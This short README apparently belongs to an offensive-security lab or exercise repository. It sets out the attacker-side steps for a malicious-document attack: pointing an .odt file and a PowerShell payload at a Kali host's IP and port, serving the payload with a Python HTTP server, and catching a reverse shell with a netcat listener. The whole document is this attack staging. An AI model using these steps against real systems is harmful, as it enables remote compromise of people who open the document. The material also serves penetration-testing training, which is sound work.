# Instructions
#### 1 - Update .odt file with Kali Station LHOST IP (keep port 80)
#### 2 - Update offsec.ps1 with Kali Station <LHOST_IP> and <LPORT>
#### 3 - Start python server in offsec.ps1 directory: python3 -m http.server 80
#### 4 - Start nc listener: nc -nlvp <LPORT>
